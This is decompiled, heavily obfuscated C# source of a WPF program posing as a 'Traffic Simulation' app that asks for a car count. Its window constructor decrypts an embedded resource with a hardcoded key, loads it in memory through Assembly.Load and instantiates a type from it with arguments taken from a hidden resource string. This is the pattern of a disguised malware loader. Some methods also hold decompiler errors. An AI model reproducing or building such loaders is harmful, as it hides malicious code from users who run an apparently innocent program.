using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Markup;

namespace Traffic_Simulation;

public class MainWindow : Window, IComponentConnector
{
	internal TextBox box;

	private bool _contentLoaded;

	private Assembly Asemia(object ji)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 1007627349;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x47D7896Bu) % 4u)
				{
				case 2u:
					result = MainWindow.smethod_0((byte[])ji);
					num = ((int)num2 * -335703451) ^ -425045484;
					continue;
				case 1u:
					num = ((int)num2 * -894838050) ^ 0x28CE1205;
					continue;
				case 3u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public MainWindow()
	{
		int num3 = default(int);
		bool flag5 = default(bool);
		Type type_ = default(Type);
		Assembly assembly_ = default(Assembly);
		string[] array = default(string[]);
		bool flag = default(bool);
		object[] object_ = default(object[]);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		while (true)
		{
			int num = -503318285;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE1CDC0B4u) % 33u)
				{
				case 32u:
					num3++;
					num = (int)((num2 * 151687785) ^ 0x767D06DC);
					continue;
				case 31u:
				{
					int num11;
					int num12;
					if (flag5)
					{
						num11 = 601763136;
						num12 = 601763136;
					}
					else
					{
						num11 = 561576860;
						num12 = 561576860;
					}
					num = num11 ^ ((int)num2 * -2133631657);
					continue;
				}
				case 30u:
					type_ = MainWindow.smethod_3(assembly_)[1];
					array = MainWindow.smethod_4(Points.Bookmarks, new char[1] { '~' });
					num = ((int)num2 * -335153196) ^ 0x7D2A5A12;
					continue;
				case 29u:
					assembly_ = Asemia(Points.Chi(Led.Red1, MainWindow.smethod_2(MainWindow.smethod_1(), "A4DC95C840QFUTHC44S847")));
					num = (int)(num2 * 1293763968) ^ -720099296;
					continue;
				case 28u:
					num = (int)(num2 * 1176507690) ^ -38602340;
					continue;
				case 27u:
					flag = true;
					num = (int)(num2 * 2080102294) ^ -1880195118;
					continue;
				case 26u:
					object_ = new object[3]
					{
						array[0],
						array[1],
						"Traffic_Simulation"
					};
					num = (int)((num2 * 254653668) ^ 0x3D438CCF);
					continue;
				case 25u:
					num3 = 0;
					num = -1012066518;
					continue;
				case 24u:
					num = ((int)num2 * -210619255) ^ 0x26272A46;
					continue;
				case 23u:
					num = (int)((num2 * 496678752) ^ 0x7492AD3B);
					continue;
				case 21u:
				{
					int num9;
					int num10;
					if (!flag2)
					{
						num9 = 1943910625;
						num10 = 1943910625;
					}
					else
					{
						num9 = 1147808559;
						num10 = 1147808559;
					}
					num = num9 ^ ((int)num2 * -1982340489);
					continue;
				}
				case 20u:
					flag5 = num3 > 251367171;
					num = (int)((num2 * 627453356) ^ 0x45F8981A);
					continue;
				case 19u:
					MainWindow.smethod_5(type_, object_);
					num = ((int)num2 * -2102163764) ^ 0x73C0E21;
					continue;
				case 18u:
					num = (int)(num2 * 439371224) ^ -1498542402;
					continue;
				case 17u:
					flag3 = !flag;
					num = (int)((num2 * 1606375308) ^ 0x430BCA26);
					continue;
				case 16u:
					num3 = 251367178;
					num = -1911204854;
					continue;
				case 15u:
				{
					int num7;
					int num8;
					if (!flag4)
					{
						num7 = -1351531766;
						num8 = -1351531766;
					}
					else
					{
						num7 = -1551224769;
						num8 = -1551224769;
					}
					num = num7 ^ ((int)num2 * -1209855227);
					continue;
				}
				case 14u:
					flag4 = false;
					num = -324123196;
					continue;
				case 13u:
					flag = true;
					num = -147043764;
					continue;
				case 12u:
					num = ((int)num2 * -1409451380) ^ 0x69768E6;
					continue;
				case 11u:
					InitializeComponent();
					num = -1395132483;
					continue;
				case 10u:
					flag = true;
					num = -1903708771;
					continue;
				case 9u:
					num = ((int)num2 * -2121353568) ^ -1830222988;
					continue;
				case 8u:
					num = ((int)num2 * -1794121016) ^ 0x688810D8;
					continue;
				case 7u:
					flag = false;
					num = (int)(num2 * 726440505) ^ -905541011;
					continue;
				case 6u:
				{
					int num5;
					int num6;
					if (flag3)
					{
						num5 = 809399725;
						num6 = 809399725;
					}
					else
					{
						num5 = 968394501;
						num6 = 968394501;
					}
					num = num5 ^ (int)(num2 * 2139036042);
					continue;
				}
				case 5u:
				{
					int num4;
					if (num3 <= 251367160)
					{
						num = -133133968;
						num4 = -133133968;
					}
					else
					{
						num = -114635362;
						num4 = -114635362;
					}
					continue;
				}
				case 4u:
					flag2 = true;
					num = -761912610;
					continue;
				case 3u:
					num = (int)(num2 * 56759153) ^ -588729008;
					continue;
				case 2u:
					num = -919955856;
					continue;
				case 0u:
					flag = true;
					num = ((int)num2 * -401278231) ^ -328104646;
					continue;
				default:
					return;
				case 22u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void box_PreviewMouseLeftButtonUp(object sender, MouseButtonEventArgs e)
	{
		bool flag = MainWindow.smethod_7(MainWindow.smethod_6(box), "Enter number");
		while (true)
		{
			int num = -452302853;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xBCFD612Au) % 5u)
				{
				case 4u:
					num = ((int)num2 * -27002372) ^ -687376022;
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -778172845;
						num4 = -778172845;
					}
					else
					{
						num3 = -218985389;
						num4 = -218985389;
					}
					num = num3 ^ ((int)num2 * -1921396915);
					continue;
				}
				case 0u:
					MainWindow.smethod_8(box, "");
					num = ((int)num2 * -1930357258) ^ -1212174987;
					continue;
				default:
					return;
				case 2u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void Start(object sender, RoutedEventArgs e)
	{
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		//IL_0154: Expected I4, but got Unknown
		//IL_0155: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Expected I4, but got Unknown
		//IL_0182: Incompatible stack heights: 0 vs 1
		//IL_01a1: Incompatible stack heights: 0 vs 1
		//IL_01b0: Incompatible stack heights: 0 vs 1
		//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cb: Incompatible stack heights: 0 vs 1
		//IL_01d5: Incompatible stack heights: 0 vs 1
		try
		{
			while (true)
			{
				int num = 1308929788;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x61548C00u) % 12u)
					{
					case 10u:
						num = 699096438;
						continue;
					case 9u:
						num = (int)((num2 * 1879083091) ^ 0x4ED02797);
						continue;
					case 8u:
					{
						int num3;
						int num4;
						if (int.Parse(MainWindow.smethod_6(box)) <= 0)
						{
							num3 = -1904495771;
							num4 = -1904495771;
						}
						else
						{
							num3 = -168516303;
							num4 = -168516303;
						}
						num = num3 ^ ((int)num2 * -1889576627);
						continue;
					}
					case 7u:
					{
						Simulation window_ = new Simulation(int.Parse(MainWindow.smethod_6(box)));
						MainWindow.smethod_9((Window)(object)window_);
						num = ((int)num2 * -115401145) ^ 0x500AA6B3;
						continue;
					}
					case 5u:
						num = ((int)num2 * -1684459904) ^ 0x4544B6DF;
						continue;
					case 4u:
						num = ((int)num2 * -537722138) ^ 0x2FD807EA;
						continue;
					case 3u:
						num = ((int)num2 * -1460408322) ^ -585563822;
						continue;
					case 2u:
						MainWindow.smethod_10((Window)(object)this);
						num = ((int)num2 * -1999737866) ^ -542894839;
						continue;
					case 1u:
						MainWindow.smethod_8(box, "Enter Number");
						num = 657933651;
						continue;
					case 0u:
						MainWindow.smethod_11("Count of the car has to greater than zero!");
						num = (int)(num2 * 470227418) ^ -1626564694;
						continue;
					default:
						return;
					case 11u:
						break;
					case 6u:
						return;
					}
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			while (true)
			{
				_ = 1188663739;
				while (true)
				{
					_003F val = /*Error near IL_0152: Stack underflow*/^ 0x61548C00;
					uint num2 = (uint)(int)val;
					switch (val % 6)
					{
					default:
						return;
					case 5:
						_ = ((int)num2 * -514612675) ^ 0x16CA3891;
						continue;
					case 3:
						MainWindow.smethod_8(box, "Enter Number");
						_ = ((int)num2 * -1750211150) ^ 0x10E3825E;
						continue;
					case 2:
						_ = (num2 * 2085165734) ^ 0x5F059B5;
						continue;
					case 1:
						MainWindow.smethod_11(MainWindow.smethod_12(exception_));
						_ = (num2 * 656475631) ^ 0x1247CB86;
						continue;
					case 4:
						break;
					case 0:
						return;
					}
					break;
				}
			}
		}
	}

	private void Window_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a6: Expected I4, but got Unknown
		//IL_01a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected I4, but got Unknown
		//IL_01c9: Incompatible stack heights: 0 vs 1
		//IL_01d0: Incompatible stack heights: 0 vs 1
		//IL_01e8: Unknown result type (might be due to invalid IL or missing references)
		bool flag = (int)MainWindow.smethod_13(e) == 6;
		Simulation window_ = default(Simulation);
		while (true)
		{
			int num = 968811009;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x2FEE77ECu) % 3u)
				{
				case 2u:
					if (flag)
					{
						goto IL_0012;
					}
					return;
				case 0u:
					break;
				default:
					try
					{
						while (true)
						{
							int num3 = 923171833;
							while (true)
							{
								switch ((num2 = (uint)num3 ^ 0x2FEE77ECu) % 12u)
								{
								case 11u:
									MainWindow.smethod_8(box, "Enter Number");
									num3 = ((int)num2 * -1160827401) ^ 0x17770BDD;
									continue;
								case 9u:
									num3 = (int)((num2 * 1929132935) ^ 0x1EF1ABB8);
									continue;
								case 8u:
									num3 = ((int)num2 * -1477131525) ^ -1759093312;
									continue;
								case 7u:
									num3 = 2127311735;
									continue;
								case 5u:
									MainWindow.smethod_9((Window)(object)window_);
									MainWindow.smethod_10((Window)(object)this);
									num3 = ((int)num2 * -238809536) ^ 0x6C711229;
									continue;
								case 4u:
									num3 = 1686302598;
									continue;
								case 3u:
									num3 = ((int)num2 * -1200228539) ^ -707226869;
									continue;
								case 2u:
									window_ = new Simulation(int.Parse(MainWindow.smethod_6(box)));
									num3 = ((int)num2 * -1476732140) ^ 0x5AB31851;
									continue;
								case 1u:
								{
									int num4;
									int num5;
									if (int.Parse(MainWindow.smethod_6(box)) <= 0)
									{
										num4 = 1643949765;
										num5 = 1643949765;
									}
									else
									{
										num4 = 1767241432;
										num5 = 1767241432;
									}
									num3 = num4 ^ (int)(num2 * 350371974);
									continue;
								}
								case 0u:
									MainWindow.smethod_11("Count of the car has to greater than zero!");
									num3 = (int)((num2 * 899591057) ^ 0x5A0E72E0);
									continue;
								default:
									return;
								case 10u:
									break;
								case 6u:
									return;
								}
								break;
							}
						}
					}
					catch (Exception exception_)
					{
						while (true)
						{
							_ = 1908619679;
							while (true)
							{
								_003F val = /*Error near IL_01a3: Stack underflow*/^ 0x2FEE77EC;
								num2 = (uint)(int)val;
								switch (val % 3)
								{
								case 2:
									_ = (num2 * 1872130065) ^ 0xCD3C4281u;
									continue;
								case 0:
									break;
								default:
									MainWindow.smethod_8(box, "Enter Number");
									MainWindow.smethod_11(MainWindow.smethod_12(exception_));
									return;
								}
								break;
							}
						}
					}
				}
				break;
				IL_0012:
				num = (int)(num2 * 558459036) ^ -1458260595;
			}
		}
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	public void InitializeComponent()
	{
		bool contentLoaded = default(bool);
		Uri uri_ = default(Uri);
		while (true)
		{
			int num = -380413451;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xFC9CB210u) % 8u)
				{
				case 7u:
					num = ((int)num2 * -1055098174) ^ -2056862004;
					continue;
				case 5u:
					contentLoaded = _contentLoaded;
					num = ((int)num2 * -563952070) ^ 0x19078A82;
					continue;
				case 4u:
					MainWindow.smethod_15((object)this, uri_);
					num = ((int)num2 * -1741502992) ^ -1168629566;
					continue;
				case 3u:
					num = (int)(num2 * 596253184) ^ -1450588073;
					continue;
				case 1u:
					_contentLoaded = true;
					uri_ = MainWindow.smethod_14("/xrauUd;component/mainwindow.xaml", UriKind.Relative);
					num = -1833543116;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!contentLoaded)
					{
						num3 = 1932566329;
						num4 = 1932566329;
					}
					else
					{
						num3 = 310382979;
						num4 = 310382979;
					}
					num = num3 ^ (int)(num2 * 68641454);
					continue;
				}
				default:
					return;
				case 6u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Expected O, but got Unknown
		//IL_00e4: Expected O, but got Unknown
		int num4 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = 370595837;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC877BA0u) % 16u)
				{
				case 15u:
					num = ((int)num2 * -747246958) ^ 0x481490EF;
					continue;
				case 14u:
					_contentLoaded = true;
					num = 1011465057;
					continue;
				case 13u:
					num4 = connectionId;
					num = ((int)num2 * -1216331342) ^ 0x2A314799;
					continue;
				case 12u:
					box = (TextBox)target;
					num = 409634538;
					continue;
				case 11u:
					num = ((int)num2 * -889291165) ^ -1425070762;
					continue;
				case 10u:
					MainWindow.smethod_17((UIElement)(object)box, new MouseButtonEventHandler(box_PreviewMouseLeftButtonUp));
					num = ((int)num2 * -1410797415) ^ -883187060;
					continue;
				case 8u:
					goto IL_008e;
				case 7u:
					num = ((int)num2 * -12073589) ^ -2141988452;
					continue;
				case 6u:
					num = (int)(num2 * 2104108516) ^ -232073033;
					continue;
				case 5u:
					goto IL_00cd;
				case 4u:
					num = ((int)num2 * -1698952518) ^ -268899319;
					continue;
				case 3u:
					num3 = num4;
					num = ((int)num2 * -846568955) ^ 0x473C87D;
					continue;
				case 2u:
					switch (num3)
					{
					case 2:
						break;
					case 1:
						goto IL_008e;
					case 3:
						goto IL_00cd;
					default:
						goto IL_011f;
					}
					goto case 12u;
				case 0u:
					num = ((int)num2 * -1814061345) ^ -495445506;
					continue;
				default:
					return;
				case 9u:
					break;
				case 1u:
					return;
					IL_011f:
					num = (int)((num2 * 1245258014) ^ 0x51A2A4AC);
					continue;
					IL_00cd:
					MainWindow.smethod_18((ButtonBase)(Button)target, new RoutedEventHandler(Start));
					num = 1373708491;
					continue;
					IL_008e:
					MainWindow.smethod_16((UIElement)(object)(MainWindow)target, new KeyEventHandler(Window_KeyDown));
					num = 1077293284;
					continue;
				}
				break;
			}
		}
	}

	static Assembly smethod_0(byte[] byte_0)
	{
		return Assembly.Load(byte_0);
	}

	static Encoding smethod_1()
	{
		return Encoding.Default;
	}

	static byte[] smethod_2(Encoding encoding_0, string string_0)
	{
		return encoding_0.GetBytes(string_0);
	}

	static Type[] smethod_3(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static string[] smethod_4(string string_0, char[] char_0)
	{
		return string_0.Split(char_0);
	}

	static object smethod_5(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static string smethod_6(TextBox textBox_0)
	{
		return textBox_0.get_Text();
	}

	static bool smethod_7(string string_0, string string_1)
	{
		return string_0 == string_1;
	}

	static void smethod_8(TextBox textBox_0, string string_0)
	{
		textBox_0.set_Text(string_0);
	}

	static void smethod_9(Window window_0)
	{
		window_0.Show();
	}

	static void smethod_10(Window window_0)
	{
		window_0.Close();
	}

	static MessageBoxResult smethod_11(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0);
	}

	static string smethod_12(Exception exception_0)
	{
		return exception_0.Message;
	}

	static Key smethod_13(KeyEventArgs keyEventArgs_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return keyEventArgs_0.get_Key();
	}

	static Uri smethod_14(string string_0, UriKind uriKind_0)
	{
		return new Uri(string_0, uriKind_0);
	}

	static void smethod_15(object object_0, Uri uri_0)
	{
		Application.LoadComponent(object_0, uri_0);
	}

	static void smethod_16(UIElement uielement_0, KeyEventHandler keyEventHandler_0)
	{
		uielement_0.add_KeyDown(keyEventHandler_0);
	}

	static void smethod_17(UIElement uielement_0, MouseButtonEventHandler mouseButtonEventHandler_0)
	{
		uielement_0.add_PreviewMouseLeftButtonUp(mouseButtonEventHandler_0);
	}

	static void smethod_18(ButtonBase buttonBase_0, RoutedEventHandler routedEventHandler_0)
	{
		buttonBase_0.add_Click(routedEventHandler_0);
	}
}
